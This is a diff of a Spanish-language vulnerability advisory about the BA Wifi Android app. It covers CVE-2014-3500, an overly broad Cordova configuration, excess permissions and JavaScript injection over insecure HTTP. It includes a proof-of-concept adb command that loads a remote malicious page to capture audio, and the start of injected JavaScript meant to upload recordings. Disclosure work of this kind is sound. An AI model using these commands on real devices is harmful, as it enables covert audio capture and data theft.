@@ -36,25 +36,25 @@
 
 ## 3. Descripción de vulnerabilidad
 
-La aplicación para Android BA Wifi [1]del Gobierno de La Ciudad de Buenos Aires, permite localizar las conexiones Wifi libres del Gobierno de la Ciudad por comunas, por puntos de interés o por ubicación. Según estadística del mercado de aplicaciones Google Play, a febrero de 2015 fue instalada entre 10.000 y 50.000 veces.
-    
-La aplicación fue desarrollada usando Apache Cordova[2](conocido también como PhoneGap), un framework de código abierto que permite construir aplicaciones para dispositivos móviles a partir de tecnología web standard. El framewok embebe en la aplicación móvil un motor de navegador web (conocido como WebView) adaptado a la características del dispositivo, para que el usuario pueda visualizar el contenido de una aplicación web. Este mecanismo permite a un desarrollador incorporar a dispositivos móviles, rápidamente y con poco esfuerzo de adaptación, aplicaciones web ya existentes o desarrolladas para otras plataformas.
-    
-El framework utilizado por la aplicación utiliza de WebView customizados para que un usuario pueda visualizar su contenido web. El problema de estas vistas es que para aumentar la usabilidad de la aplicación, se rompe el sandbox de un browser habitual, permitiendo que un script dentro del contenido interactúe con componentes del sistema. El framework de Cordova permite correr código Java embebido a través de interfaces definidas por el mismo. Debido al _target-SDK_de BA WiFi, en dispositivos con versiones anteriores a 4.4.4, Javascript malicioso inyectado puede llegar a correr código nativo arbitrariamente. Debido a que la aplicación posee más permisos de los necesarios (grabar audio y video, capturar fotos, recibir SMS, leer y escribir contactos y en la memoria externa), Javascript malicioso podría a llegar a realizar cualquiera utilizar estas funcionalidades, sin importar la versión de Android del dispositivo.
-    
+La aplicación para Android BA Wifi [1] del Gobierno de La Ciudad de Buenos Aires, permite localizar las conexiones Wifi libres del Gobierno de la Ciudad por comunas, por puntos de interés o por ubicación. Según estadística del mercado de aplicaciones Google Play, a febrero de 2015 fue instalada entre 10.000 y 50.000 veces.
+ 
+La aplicación fue desarrollada usando Apache Cordova[2] (conocido también como PhoneGap), un framework de código abierto que permite construir aplicaciones para dispositivos móviles a partir de tecnología web standard. El framewok embebe en la aplicación móvil un motor de navegador web (conocido como WebView) adaptado a la características del dispositivo, para que el usuario pueda visualizar el contenido de una aplicación web. Este mecanismo permite a un desarrollador incorporar a dispositivos móviles, rápidamente y con poco esfuerzo de adaptación, aplicaciones web ya existentes o desarrolladas para otras plataformas.
+ 
+El framework utilizado por la aplicación utiliza de WebView customizados para que un usuario pueda visualizar su contenido web. El problema de estas vistas es que para aumentar la usabilidad de la aplicación, se rompe el sandbox de un browser habitual, permitiendo que un script dentro del contenido interactúe con componentes del sistema. El framework de Cordova permite correr código Java embebido a través de interfaces definidas por el mismo. Debido al _target-SDK_ de BA WiFi, en dispositivos con versiones anteriores a 4.4.4, Javascript malicioso inyectado puede llegar a correr código nativo arbitrariamente. Debido a que la aplicación posee más permisos de los necesarios (grabar audio y video, capturar fotos, recibir SMS, leer y escribir contactos y en la memoria externa), Javascript malicioso podría a llegar a realizar cualquiera utilizar estas funcionalidades, sin importar la versión de Android del dispositivo.
+ 
 Como la aplicación intenta obtener las direcciones desde la ubicación actual del dispositivo a las de las redes abiertas de forma insegura, es posible inyectar Javascript malicioso por cualquier atacante en la red conectada o que se encuentre en la ruta al servidor.  
-    
+ 
 La configuración utilizada de Apache Cordova/PhoneGap es también insegura. Permite a la aplicación conectarse a cualquier dominio y no solo al dominio donde se encuentra el servidor, esto permite al atacante forzar a la aplicación a acceder a un servidor remoto posiblemente malicioso. La segunda razón, es que expone todos los plugin que permiten acceder a un recurso del celular desde Javascript. La aplicación debería sólo aquellos plugins que son necesitados para su correcto funcionamiento, en este caso geolocalización y acceso a internet. 
-    
+
 
 ## 4. Paquetes vulnerables
 
 * Dispositivos corriendo la versión 1.1 o versiones anteriores.
 
 ## 5. Información y soluciones del fabricante
+ 
+ El fabricante actualizó la aplicación el 10 de abril de 2015 y la versión 2.0 soluciona los problemas mencionados.
 
-El fabricante actualizó la aplicación el 10 de abril de 2015 y la versión 2.0 soluciona los problemas mencionados.
-    
 
 ## 6. Créditos
 
@@ -62,20 +62,17 @@ Las vulnerabilidades fueron descubiertas e investigadas por Joaquín Rinaudo. La
 
 ## 7. Descripción técnica
 
-BA Wifi utiliza la versión de PhoneGap 2.3.0 que es vulnerable a CVE-2014-3500 [3]permitiendole a otras aplicaciones cambiar la página de inicio de la aplicación por una con contenido malicioso a través de un Intent que lleve un parámetro extra con referencia al contenido bajo la clave _url_. 
+BA Wifi utiliza la versión de PhoneGap 2.3.0 que es vulnerable a CVE-2014-3500 [3] permitiendole a otras aplicaciones cambiar la página de inicio de la aplicación por una con contenido malicioso a través de un Intent que lleve un parámetro extra con referencia al contenido bajo la clave _url_. 
   
 La correcta configuración del framework podría llegar a bloquear dicho ataque cuando se restringen los dominios a los cuales la aplicación se puede conectar a través del archivo de configuración _res/xml/config.xml_. Sin embargo, BA Wifi permite a la aplicación acceder a cualquier dominio dado a que para filtrar los accesos utiliza un comodín.
   
-Dentro de este archivo de configuración se encuentran también listados los plugins del framework de PhoneGap utilizados. Muchos de estos plugins incluidos en BA Wifi no son necesarios para su funcionamiento. Por ejemplo, _Media_permite reproducir y grabar audio desde Javascript.  _ContactManager_permite el manejo de los contactos del dispositivo y _Capture_permite capturar fotos y videos. Ninguno de estos módulos son  utilizado por BA Wifi pero permitirían que atacantes que lleguen a comprometer la aplicación puedan utilizarlos. Además de incluir estos plugins, la aplicación necesita pedir los permisos necesarios de Android para poder utilizar estos recursos. Sucede que BA Wifi es una aplicación sobreprivilegiada, es decir, requiere más permisos de los que utiliza. Para poder ser instalada, un usuario tiene que permitir el acceso a la aplicación a sus contactos, a la cámara, permitir grabar audio y video, recibir SMS, leer y escribir en la memoria externa además de los permisos que si podrían son utilizados como acceso a su ubicación e internet.  
+Dentro de este archivo de configuración se encuentran también listados los plugins del framework de PhoneGap utilizados. Muchos de estos plugins incluidos en BA Wifi no son necesarios para su funcionamiento. Por ejemplo, _Media_ permite reproducir y grabar audio desde Javascript.  _ContactManager_ permite el manejo de los contactos del dispositivo y _Capture_ permite capturar fotos y videos. Ninguno de estos módulos son  utilizado por BA Wifi pero permitirían que atacantes que lleguen a comprometer la aplicación puedan utilizarlos. Además de incluir estos plugins, la aplicación necesita pedir los permisos necesarios de Android para poder utilizar estos recursos. Sucede que BA Wifi es una aplicación sobreprivilegiada, es decir, requiere más permisos de los que utiliza. Para poder ser instalada, un usuario tiene que permitir el acceso a la aplicación a sus contactos, a la cámara, permitir grabar audio y video, recibir SMS, leer y escribir en la memoria externa además de los permisos que si podrían son utilizados como acceso a su ubicación e internet.  
   
-Como prueba de concepto que la aplicación es vulnerable a CVE-2014-3500 se puede enviar el siguiente comando a través de adb (Android Debug Bridge) que simularía ser una aplicación que envía un Intent malicioso que inyecta Javascript utilizando el módulo _Media_[4]logrando capturar audio.
-  
-```
-adb shell am start -n ar.gob.ba.bawifi/.bawifi --es url "https://googledrive.com/host/0B0f57xoYl_BFOG5FMEhpc3AzckU/testing.html"
-```
+Como prueba de concepto que la aplicación es vulnerable a CVE-2014-3500 se puede enviar el siguiente comando a través de adb (Android Debug Bridge) que simularía ser una aplicación que envía un Intent malicioso que inyecta Javascript utilizando el módulo _Media_[4] logrando capturar audio.
 
-BA Wifi intenta obtener el recorrido a los lugares donde hay redes abierta a partir de la ubicación del dispositivo. Para ello, se envía un pedido HTTP a _http://recorridos.usig.buenosaires.gob.ar/2.0/consultar_recorrido_. Este pedido devuelve un Javascript (originalmente un Callback) que se corre en un contexto de un iframe dentro de la ventana principal de la aplicación. Dado a que el pedido se realiza mediante transporte inseguro, atacantes podrían realizar Man-in-the-Middle e inyectar su propio Javascript. Nuevamente, dado a que Phonegap utiliza interfaces que conectan Java con Javascript, es posible acceder a información privada del usuario a través de estas inyecciones de código. Por ejemplo, el siguiente código inyectado al pedido permite grabar audio y subirlo a un servidor malicioso. Este inyecta al documento del padre con un tag de _script_similar al del ejemplo anterior. 
-  
+_ adb shell am start -n ar.gob.ba.bawifi/.bawifi --es url "https://googledrive.com/host/0B0f57xoYl_BFOG5FMEhpc3AzckU/testing.html"_
+BA Wifi intenta obtener el recorrido a los lugares donde hay redes abierta a partir de la ubicación del dispositivo. Para ello, se envía un pedido HTTP a _http://recorridos.usig.buenosaires.gob.ar/2.0/consultar_recorrido_. Este pedido devuelve un Javascript (originalmente un Callback) que se corre en un contexto de un iframe dentro de la ventana principal de la aplicación. Dado a que el pedido se realiza mediante transporte inseguro, atacantes podrían realizar Man-in-the-Middle e inyectar su propio Javascript. Nuevamente, dado a que Phonegap utiliza interfaces que conectan Java con Javascript, es posible acceder a información privada del usuario a través de estas inyecciones de código. Por ejemplo, el siguiente código inyectado al pedido permite grabar audio y subirlo a un servidor malicioso. Este inyecta al documento del padre con un tag de _script_ similar al del ejemplo anterior. 
+
 ```
     function loadjsfile(filename){
 
@@ -99,8 +96,8 @@ BA Wifi intenta obtener el recorrido a los lugares donde hay redes abierta a par
 
 ```
 
-Por último, inyectar código Javascript permitiría ejecutar código arbitrariamente en dispositivos con versiones corriendo anteriores a la 4.4.4 dado que la aplicación cuenta un _targetSDK_menor a 17 lo permite que se pueda utilizar Java Reflection para acceder a otras clases que no sean la expuesta a través de la interface con _addJavascriptInterface_. A partir de la versión 4.4.4, el motor que implementa Webview bloquea el uso de Java Reflection [5].
-  
+Por último, inyectar código Javascript permitiría ejecutar código arbitrariamente en dispositivos con versiones corriendo anteriores a la 4.4.4 dado que la aplicación cuenta un _targetSDK_ menor a 17 lo permite que se pueda utilizar Java Reflection para acceder a otras clases que no sean la expuesta a través de la interface con _addJavascriptInterface_. A partir de la versión 4.4.4, el motor que implementa Webview bloquea el uso de Java Reflection [5].
+
 
 ## 8. Cronología del reporte
 
